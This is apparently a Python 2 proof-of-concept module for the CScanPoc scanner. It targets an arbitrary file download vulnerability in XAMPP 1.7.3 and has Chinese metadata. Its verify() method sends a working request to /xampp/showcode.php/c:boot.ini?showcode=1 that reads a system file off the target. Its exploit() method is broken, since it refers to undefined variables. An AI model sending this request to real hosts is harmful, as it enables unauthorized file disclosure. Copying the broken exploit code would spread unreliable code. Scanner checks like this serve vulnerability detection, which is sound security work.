# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib
import urllib2
import re


class Vuln(ABVuln):
    vuln_id = 'XAMPP_0001'  # 平台漏洞编号，留空
    name = 'XAMPP 1.7.3 /xampp/showcode.php 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2010-11-01'  # 漏洞公布时间
    desc = '''
        XAMPP（Apache+MySQL+PHP+PERL）是一个功能强大的建站集成软件包。这个软件包原来的名字是 LAMPP，但是为了避免误解，最新的几个版本就改名为 XAMPP 了。它可以在Windows、Linux、Solaris、Mac OS X 等多种操作系统下安装使用，支持多语言：英文、简体中文、繁体中文、韩文、俄文、日文等。
        XAMPP 1.7.3 /xampp/showcode.php 任意文件下载漏洞。
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/15370/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'XAMPP'  # 漏洞应用名称
    product_version = '1.7.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1d5ef762-f565-4330-bf1f-527e67a35bee'
    author = '国光'  # POC编写者
    create_date = '2018-05-09'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = '{target}'.format(
                target=self.target)+'/xampp/showcode.php/c:boot.ini?showcode=1'
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            if "<textarea cols='100' rows='10'>[boot loader]" in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))

            if res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的为{data}'.format(
                    target=self.target, name=self.vuln.name, data=exploit_data))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
